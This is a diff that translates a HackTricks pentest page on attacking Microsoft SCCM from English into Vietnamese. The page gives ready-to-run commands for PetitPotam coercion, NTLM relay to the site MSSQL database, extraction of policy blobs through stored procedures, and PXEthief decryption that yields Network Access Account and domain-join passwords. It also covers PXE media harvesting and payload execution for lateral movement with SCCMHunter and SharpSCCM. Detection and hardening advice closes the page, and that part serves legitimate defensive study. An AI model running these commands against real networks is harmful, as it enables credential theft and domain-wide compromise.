@@ -3,40 +3,40 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-By coercing a **System Center Configuration Manager (SCCM) Management Point (MP)** to authenticate over SMB/RPC and **relaying** that NTLM machine account to the **site database (MSSQL)** you obtain `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights.  These roles let you call a set of stored procedures that expose **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables, etc.).  The blobs are hex-encoded/encrypted but can be decoded and decrypted with **PXEthief**, yielding plaintext secrets.<sup>[[2]](#references)</sup>
+Bằng cách buộc một **System Center Configuration Manager (SCCM) Management Point (MP)** xác thực qua SMB/RPC rồi **relay** tài khoản máy NTLM đó đến **site database (MSSQL)**, bạn có được quyền `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Các role này cho phép bạn gọi một nhóm stored procedure làm lộ các policy blob của **Operating System Deployment (OSD)** (thông tin xác thực Network Access Account, biến Task-Sequence, v.v.). Các blob được mã hóa bằng hex/mã hóa, nhưng có thể giải mã và giải mã hóa bằng **PXEthief**, cho ra các secret dạng plaintext.<sup>[[2]](#references)</sup>
 
-High-level chain:
-1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
-2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
-3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
-4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
-5. Execute:
+Chuỗi tấn công tổng quan:
+1. Tìm MP và site DB ↦ endpoint HTTP không cần xác thực `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+2. Khởi chạy `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
+3. Buộc MP xác thực bằng **PetitPotam**, PrinterBug, DFSCoerce, v.v.
+4. Thông qua SOCKS proxy, kết nối bằng `mssqlclient.py -windows-auth` với tư cách tài khoản **<DOMAIN>\\<MP-host>$** đã bị relay.
+5. Thực thi:
    * `use CM_<SiteCode>`
    * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
-   * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
-6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
+   * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (hoặc `MP_GetPolicyBodyAfterAuthorization`)
+6. Xóa BOM `0xFFFE`, chạy `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
 
-Secrets such as `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. are recovered without touching PXE or clients.<sup>[[1]](#references)[[3]](#references)</sup>
+Có thể lấy được các secret như `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, v.v. mà không cần truy cập PXE hay client.<sup>[[1]](#references)[[3]](#references)</sup>
 
 ---
 
-## 1. Enumerating unauthenticated MP endpoints
-The MP ISAPI extension **GetAuth.dll** exposes several parameters that don’t require authentication (unless the site is PKI-only):<sup>[[1]](#references)</sup>
+## 1. Liệt kê các endpoint MP không cần xác thực
+Phần mở rộng ISAPI **GetAuth.dll** của MP cung cấp một số tham số không yêu cầu xác thực (trừ khi site chỉ dùng PKI):<sup>[[1]](#references)</sup>
 
-| Parameter | Purpose |
+| Tham số | Mục đích |
 |-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | Returns site signing cert public key + GUIDs of *x86* / *x64* **All Unknown Computers** devices. |
-| `MPLIST` | Lists every Management-Point in the site. |
-| `SITESIGNCERT` | Returns Primary-Site signing certificate (identify the site server without LDAP). |
+| `MPKEYINFORMATIONMEDIA` | Trả về public key của chứng chỉ ký site cùng các GUID của thiết bị *x86* / *x64* **All Unknown Computers**. |
+| `MPLIST` | Liệt kê mọi Management-Point trong site. |
+| `SITESIGNCERT` | Trả về chứng chỉ ký Primary-Site (xác định site server mà không cần LDAP). |
 
-Grab the GUIDs that will act as the **clientID** for later DB queries:
+Lấy các GUID sẽ được dùng làm **clientID** cho những truy vấn DB sau:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
 
 ---
 
-## 2. Relay the MP machine account to MSSQL
+## 2. Relay tài khoản máy MP đến MSSQL
 ```bash
 # 1. Start the relay listener (SMB→TDS)                              
 ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
@@ -45,7 +45,7 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
        -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-When the coercion fires you should see something like:
+Khi coercion được kích hoạt, bạn sẽ thấy nội dung tương tự như sau:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
@@ -53,14 +53,14 @@ When the coercion fires you should see something like:
 
 ---
 
-## 3. Identify OSD policies via stored procedures
-Connect through the SOCKS proxy (port 1080 by default):<sup>[[1]](#references)</sup>
+## 3. Xác định chính sách OSD thông qua stored procedures
+Kết nối thông qua SOCKS proxy (cổng 1080 theo mặc định):<sup>[[1]](#references)</sup>
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-Switch to the **CM_<SiteCode>** DB (use the 3-digit site code, e.g. `CM_001`).
+Chuyển sang DB **CM_<SiteCode>** (dùng mã site gồm 3 chữ số, ví dụ: `CM_001`).
 
-### 3.1  Find Unknown-Computer GUIDs (optional)
+### 3.1  Tìm GUID của máy tính chưa xác định (tùy chọn)
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
@@ -68,27 +68,27 @@ FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
 
-### 3.2  List assigned policies
+### 3.2 Liệt kê các chính sách được chỉ định
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-Each row contains `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.
+Mỗi hàng chứa `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.
 
-Focus on policies:
-* **NAAConfig**  – Network Access Account creds
-* **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
-* **CollectionSettings** – Can contain run-as accounts
+Tập trung vào các policy:
+* **NAAConfig** – thông tin xác thực Network Access Account
+* **TS_Sequence** – các biến Task Sequence (OSDJoinAccount/Password)
+* **CollectionSettings** – Có thể chứa các tài khoản run-as
 
-### 3.3  Retrieve full body
-If you already have `PolicyID` & `PolicyVersion` you can skip the clientID requirement using:
+### 3.3  Truy xuất toàn bộ nội dung
+Nếu đã có `PolicyID` và `PolicyVersion`, bạn có thể bỏ qua yêu cầu về clientID bằng cách dùng:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> IMPORTANT: In SSMS increase “Maximum Characters Retrieved” (>65535) or the blob will be truncated.
+> QUAN TRỌNG: Trong SSMS, hãy tăng “Maximum Characters Retrieved” (>65535), nếu không blob sẽ bị cắt bớt.
 
 ---
 
-## 4. Decode & decrypt the blob
+## 4. Giải mã và giải mã hóa blob
 ```bash
 # Remove the UTF-16 BOM, convert from hex → XML
 echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
@@ -96,7 +96,7 @@ echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
 # Decrypt with PXEthief (7 = decrypt attribute value)
 python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
 ```
-Recovered secrets example:
+Ví dụ về các bí mật đã khôi phục:
 ```
 OSDJoinAccount : CONTOSO\\joiner
 OSDJoinPassword: SuperSecret2025!
@@ -106,20 +106,20 @@ NetworkAccessPassword: P4ssw0rd123
 
 ---
 
-## 5. Relevant SQL roles & procedures
-Upon relay the login is mapped to:<sup>[[1]](#references)</sup>
+## 5. Các SQL role & procedure liên quan
+Sau khi relay, login được ánh xạ tới:<sup>[[1]](#references)</sup>
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
-These roles expose dozens of EXEC permissions, the key ones used in this attack are:
+Các role này có hàng chục quyền EXEC; những quyền chính được dùng trong cuộc tấn công này là:
 
-| Stored Procedure | Purpose |
+| Stored Procedure | Mục đích |
 |------------------|---------|
-| `MP_GetMachinePolicyAssignments` | List policies applied to a `clientID`. |
-| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Return complete policy body. |
-| `MP_GetListOfMPsInSiteOSD` | Returned by `MPKEYINFORMATIONMEDIA` path. |
+| `MP_GetMachinePolicyAssignments` | Liệt kê các policy được áp dụng cho `clientID`. |
+| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Trả về toàn bộ nội dung policy. |
+| `MP_GetListOfMPsInSiteOSD` | Được trả về qua đường dẫn `MPKEYINFORMATIONMEDIA`. |
 
-You can inspect the full list with:
+Bạn có thể kiểm tra danh sách đầy đủ bằng cách:
 ```sql
 SELECT pr.name
 FROM   sys.database_principals AS dp
@@ -131,24 +131,24 @@ WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
 
 ---
 
-## 6. PXE boot media harvesting (SharpPXE)
-* **PXE reply over UDP/4011**: send a PXE boot request to a Distribution Point configured for PXE. The proxyDHCP response reveals boot paths such as `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) and `SMSBoot\\x64\\pxe\\boot.bcd`, plus an optional encrypted key blob.<sup>[[4]](#references)</sup>
-* **Retrieve boot artifacts via TFTP**: use the returned paths to download `variables.dat` over TFTP (unauthenticated). The file is small (a few KB) and contains the encrypted media variables.
-* **Decrypt or crack**:
-  - If the response includes the decryption key, feed it to **SharpPXE** to decrypt `variables.dat` directly.
-  - If no key is provided (PXE media protected by a custom password), SharpPXE emits a **Hashcat-compatible** `$sccm$aes128$...` hash for offline cracking. After recovering the password, decrypt the file.
-* **Parse decrypted XML**: plaintext variables contain SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUIDs, and other identifiers). SharpPXE parses them and prints a ready-to-run **SharpSCCM** command with GUID/PFX/site parameters prefilled for follow-on abuse.
-* **Requirements**: only network reachability to the PXE listener (UDP/4011) and TFTP; no local admin privileges are needed.
+## 6. Thu thập boot media PXE (SharpPXE)
+* **PXE reply qua UDP/4011**: gửi yêu cầu boot PXE đến Distribution Point được cấu hình cho PXE. Phản hồi proxyDHCP tiết lộ các đường dẫn boot như `SMSBoot\\x64\\pxe\\variables.dat` (cấu hình được mã hóa) và `SMSBoot\\x64\\pxe\\boot.bcd`, cùng một blob khóa được mã hóa tùy chọn.<sup>[[4]](#references)</sup>
+* **Lấy boot artifacts qua TFTP**: dùng các đường dẫn được trả về để tải `variables.dat` qua TFTP (không cần xác thực). Tệp này nhỏ (vài KB) và chứa các biến media được mã hóa.
+* **Giải mã hoặc crack**:
+  - Nếu phản hồi có khóa giải mã, đưa khóa đó cho **SharpPXE** để giải mã trực tiếp `variables.dat`.
+  - Nếu không có khóa (media PXE được bảo vệ bằng mật khẩu tùy chỉnh), SharpPXE xuất ra hash `$sccm$aes128$...` **tương thích với Hashcat** để crack offline. Sau khi khôi phục mật khẩu, giải mã tệp.
+* **Phân tích XML đã giải mã**: các biến dạng plaintext chứa metadata triển khai SCCM (**URL Management Point**, **Site Code**, GUID của media và các định danh khác). SharpPXE phân tích chúng và in ra một lệnh **SharpSCCM** có thể chạy ngay, với các tham số GUID/PFX/site được điền sẵn để tiếp tục khai thác.
+* **Yêu cầu**: chỉ cần kết nối mạng đến PXE listener (UDP/4011) và TFTP; không cần quyền local admin.
 
 ---
 
-## 7. SCCM client execution for lateral movement
+## 7. Thực thi SCCM client để lateral movement
 
-This is **abuse of legitimate deployment authority**, not an unauthenticated SCCM vulnerability: the operator must already hold a role that can deploy applications or create/approve client scripts (or control a component/account with those rights). The resulting execution can run as the logged-on user or as `SYSTEM`, making a compromised SCCM control plane a high-impact lateral-movement primitive.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
+Đây là **lạm dụng quyền triển khai hợp lệ**, không phải lỗ hổng SCCM không cần xác thực: operator phải có sẵn một role có thể triển khai ứng dụng hoặc tạo/phê duyệt client script (hoặc kiểm soát một component/account có các quyền đó). Việc thực thi có thể chạy với quyền của người dùng đang đăng nhập hoặc dưới dạng `SYSTEM`, khiến một SCCM control plane bị compromise trở thành công cụ lateral movement có tác động lớn.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
 
-### Client scripts with SCCMHunter
+### Client script với SCCMHunter
 
-After connecting to the site server with [SCCMHunter](https://github.com/garrettfoster13/sccmhunter), resolve the target to its SCCM resource ID, enter its context, and submit a PowerShell script. The tool can create, approve, execute, retrieve the result of, and remove the temporary SCCM script; sites that prohibit an author from approving their own script require separate approval credentials.<sup>[[6]](#references)[[7]](#references)</sup>
+Sau khi kết nối đến site server bằng [SCCMHunter](https://github.com/garrettfoster13/sccmhunter), xác định SCCM resource ID của mục tiêu, chuyển sang context của mục tiêu và gửi một PowerShell script. Công cụ có thể tạo, phê duyệt, thực thi, lấy kết quả và xóa SCCM script tạm thời; các site không cho phép tác giả tự phê duyệt script của mình yêu cầu thông tin xác thực phê duyệt riêng.<sup>[[6]](#references)[[7]](#references)</sup>
 
 ```bash
 python3 sccmhunter.py admin -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ip <SITE_SERVER>
@@ -157,17 +157,17 @@ python3 sccmhunter.py admin -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ip <SITE_SERVE
 (<RESOURCE_ID>) (C:\) >> script /path/to/payload.ps1
 ```
 
-The usual client-side ancestry is `CcmExec.exe -> PowerShell.exe`. If the script writes through `$env:USERPROFILE` and the result lands below `C:\Windows\System32\config\systemprofile`, the selected execution context was `SYSTEM`.<sup>[[7]](#references)</sup>
+Chuỗi tiến trình phía máy khách thường là `CcmExec.exe -> PowerShell.exe`. Nếu script ghi dữ liệu thông qua `$env:USERPROFILE` và kết quả nằm trong `C:\Windows\System32\config\systemprofile`, thì ngữ cảnh thực thi được chọn là `SYSTEM`.<sup>[[7]](#references)</sup>
 
-### Application deployment with SharpSCCM
+### Triển khai ứng dụng bằng SharpSCCM
 
-[SharpSCCM](https://github.com/Mayyhem/SharpSCCM) can create a temporary application/deployment for a device and execute a command, local path, or UNC path. `-s` selects the `SYSTEM` context; without it, `exec` defaults to the logged-on user. The path must already be reachable by the selected target/context.<sup>[[5]](#references)[[7]](#references)</sup>
+[SharpSCCM](https://github.com/Mayyhem/SharpSCCM) có thể tạo ứng dụng/triển khai tạm thời cho một thiết bị và thực thi lệnh, đường dẫn cục bộ hoặc đường dẫn UNC. `-s` chọn ngữ cảnh `SYSTEM`; nếu không có tùy chọn này, `exec` mặc định sử dụng người dùng đang đăng nhập. Đường dẫn phải có thể được ngữ cảnh/đối tượng đích đã chọn truy cập từ trước.<sup>[[5]](#references)[[7]](#references)</sup>
 
 ```powershell
 SharpSCCM.exe exec -d <TARGET_DEVICE> -p C:\Temp\payload.exe -s
 ```
 
-Application execution has a different ancestry from the client-script feature. `CcmExec.exe` receives policy and uses `CITaskMgr.dll` to submit an asynchronous local WMI request; the already-running `WmiPrvSE.exe` hosting the SCCM provider performs process creation. Consequently, a detector limited to `CcmExec.exe -> PowerShell.exe` misses application-deployment execution.<sup>[[7]](#references)[[8]](#references)</sup>
+Application execution có chuỗi tiến trình tổ tiên khác với tính năng client-script. `CcmExec.exe` nhận policy và dùng `CITaskMgr.dll` để gửi một yêu cầu WMI cục bộ bất đồng bộ; tiến trình `WmiPrvSE.exe` đang chạy, vốn lưu trữ SCCM provider, sẽ tạo tiến trình. Do đó, detector chỉ theo dõi `CcmExec.exe -> PowerShell.exe` sẽ bỏ sót hoạt động thực thi khi triển khai ứng dụng.<sup>[[7]](#references)[[8]](#references)</sup>
 
 ```text
 CcmExec.exe
@@ -182,56 +182,55 @@ WmiPrvSE.exe
   -> deployed process
 ```
 
-The request carries `AppDeliveryTypeId`, `Revision`, `ContentPath`, `ActionType`, `UserSid`, and `SessionId`. `AppProvider.dll` reads those inputs, resolves the deployment synclet, and reaches `AppExcnLib.dll!CAppExecutionLibrary_RunCmdAsUser`; the SCCM wrapper in `ccmcore.dll` then creates the process. This explains why `WmiPrvSE.exe`, rather than `CcmExec.exe`, is recorded as the payload's parent.<sup>[[7]](#references)</sup>
+Request mang theo `AppDeliveryTypeId`, `Revision`, `ContentPath`, `ActionType`, `UserSid` và `SessionId`. `AppProvider.dll` đọc các đầu vào này, phân giải deployment synclet và gọi đến `AppExcnLib.dll!CAppExecutionLibrary_RunCmdAsUser`; sau đó, SCCM wrapper trong `ccmcore.dll` tạo process. Điều này giải thích vì sao `WmiPrvSE.exe`, chứ không phải `CcmExec.exe`, được ghi nhận là tiến trình cha của payload.<sup>[[7]](#references)</sup>
 
-> **Reverse-engineering hint:** in a 64-bit COM call decompiled as `(**(code **)(*services + 0xc8))(services, ...)`, divide the byte offset by the pointer size: `0xc8 / 8 = 25`. Mapping slot 25 in `IWbemServices` identifies `ExecMethodAsync`, which immediately returns while WMI forwards the request to the provider.<sup>[[7]](#references)[[8]](#references)</sup>
+> **Gợi ý reverse engineering:** trong một lệnh gọi COM 64-bit được decompile thành `(**(code **)(*services + 0xc8))(services, ...)`, hãy chia byte offset cho kích thước con trỏ: `0xc8 / 8 = 25`. Ánh xạ slot 25 trong `IWbemServices` cho biết đó là `ExecMethodAsync`, hàm này trả về ngay trong khi WMI chuyển tiếp request đến provider.<sup>[[7]](#references)[[8]](#references)</sup>
 
-### Hunting application and package execution
+### Săn tìm việc thực thi ứng dụng và gói
 
-Correlate **module loads with process creation**, rather than depending only on parent names. With Sysmon Image Load telemetry enabled, find `WmiPrvSE.exe` instances that load `C:\Windows\CCM\AppProvider.dll`, then join that process's `ProcessGuid` to later process-creation events whose `ParentProcessGuid` matches. Group the child image and command line across endpoints: a payload seen on only a few clients is worth prioritizing over a common deployment launcher. Rarity is a heuristic, not proof—legitimate one-off deployments exist and an adversary can deploy broadly.<sup>[[7]](#references)</sup>
+Tương quan **module load với việc tạo process**, thay vì chỉ dựa vào tên tiến trình cha. Khi bật telemetry Sysmon Image Load, hãy tìm các phiên bản `WmiPrvSE.exe` nạp `C:\Windows\CCM\AppProvider.dll`, sau đó nối `ProcessGuid` của process đó với các sự kiện tạo process về sau có `ParentProcessGuid` trùng khớp. Nhóm image con và command line trên các endpoint: payload chỉ xuất hiện trên một vài client đáng được ưu tiên điều tra hơn một deployment launcher phổ biến. Độ hiếm chỉ là một heuristic, không phải bằng chứng — vẫn có các deployment hợp lệ chỉ chạy một lần và đối phương có thể triển khai trên diện rộng.<sup>[[7]](#references)</sup>
 
-Account for these blind spots when baselining:<sup>[[7]](#references)</sup>
+Khi thiết lập baseline, cần tính đến các điểm mù sau:<sup>[[7]](#references)</sup>
 
-- An x86 application may produce `WmiPrvSE.exe -> C:\Windows\CCM\Ccm32BitLauncher.exe -> application` rather than a direct application child.
-- A **package** deployment can skip `WmiPrvSE.exe` entirely: `CcmExec.exe -> Ccm32BitLauncher.exe -> package payload`.
-- An application deployment can intentionally launch PowerShell, producing `WmiPrvSE.exe -> PowerShell.exe`; PowerShell Script Block Logging (event ID `4104`) remains useful for recovering script content.
+- Ứng dụng x86 có thể tạo chuỗi `WmiPrvSE.exe -> C:\Windows\CCM\Ccm32BitLauncher.exe -> application` thay vì có application làm tiến trình con trực tiếp.
+- Một deployment **package** có thể bỏ qua hoàn toàn `WmiPrvSE.exe`: `CcmExec.exe -> Ccm32BitLauncher.exe -> package payload`.
+- Deployment ứng dụng có thể chủ ý khởi chạy PowerShell, tạo ra chuỗi `WmiPrvSE.exe -> PowerShell.exe`; PowerShell Script Block Logging (event ID `4104`) vẫn hữu ích để khôi phục nội dung script.
 
-On clients, collect `C:\Windows\CCM\Logs\AppEnforce.log` for application install/uninstall enforcement details. `execmgr.log` instead records packages and task sequences, so ingest both when hunting across application and package deployment paths.<sup>[[9]](#references)</sup>
-
----
-
-## 8. Detection & Hardening
-1. **Monitor MP logins** – any MP computer account logging in from an IP that isn’t its host ≈ relay.<sup>[[1]](#references)</sup>
-2. Enable **Extended Protection for Authentication (EPA)** on the site database (`PREVENT-14`).
-3. Disable unused NTLM, enforce SMB signing, restrict RPC (
-   same mitigations used against `PetitPotam`/`PrinterBug`).
-4. Harden MP ↔ DB communication with IPSec / mutual-TLS.
-5. **Constrain PXE exposure** – firewall UDP/4011 and TFTP to trusted VLANs, require PXE passwords, and alert on TFTP downloads of `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>
+Trên client, thu thập `C:\Windows\CCM\Logs\AppEnforce.log` để xem chi tiết việc thực thi cài đặt/gỡ cài đặt ứng dụng. `execmgr.log` ghi lại package và task sequence, vì vậy hãy thu thập cả hai khi săn tìm trên các luồng deployment ứng dụng và package.<sup>[[9]](#references)</sup>
 
 ---
 
-## See also
-* NTLM relay fundamentals:
+## 8. Phát hiện & Tăng cường bảo mật
+1. **Giám sát MP login** – bất kỳ lần đăng nhập nào của computer account MP từ IP không phải host của nó ≈ relay.<sup>[[1]](#references)</sup>
+2. Bật **Extended Protection for Authentication (EPA)** trên site database (`PREVENT-14`).
+3. Tắt NTLM không sử dụng, bắt buộc SMB signing, hạn chế RPC (
+   dùng các biện pháp giảm thiểu tương tự như khi đối phó với `PetitPotam`/`PrinterBug`).
+4. Tăng cường bảo mật kết nối MP ↔ DB bằng IPSec / mutual-TLS.
+5. **Hạn chế phạm vi PXE** – firewall UDP/4011 và TFTP trong các VLAN đáng tin cậy, yêu cầu mật khẩu PXE và cảnh báo khi tải TFTP các tệp `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>
+
+---
+
+## Xem thêm
+* Kiến thức cơ bản về NTLM relay:
   
 {{#ref}}
   ../ntlm/README.md
   {{#endref}}
 
-* MSSQL abuse & post-exploitation:
+* Lạm dụng MSSQL & hậu khai thác:
   
 {{#ref}}
   abusing-ad-mssql.md
   {{#endref}}
 
 ## References
-- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [1] [Tôi muốn nói chuyện với quản lý của bạn: Đánh cắp bí mật bằng Management Point Relay](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
 - [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
 - [4] [SharpPXE](https://github.com/leftp/SharpPXE)
 - [5] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
 - [6] [SCCMHunter](https://github.com/garrettfoster13/sccmhunter)
-- [7] [Unmasking SCCM Application Execution](https://specterops.io/blog/2026/09/10/unmasking-sccm-application-execution/)
-- [8] [IWbemServices::ExecMethodAsync method](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-iwbemservices-execmethodasync)
-- [9] [Log file reference - Configuration Manager](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)
-
+- [7] [Làm rõ cách thực thi ứng dụng SCCM](https://specterops.io/blog/2026/09/10/unmasking-sccm-application-execution/)
+- [8] [Phương thức IWbemServices::ExecMethodAsync](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-iwbemservices-execmethodasync)
+- [9] [Tham khảo tệp log - Configuration Manager](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)
 {{#include ../../banners/hacktricks-training.md}}
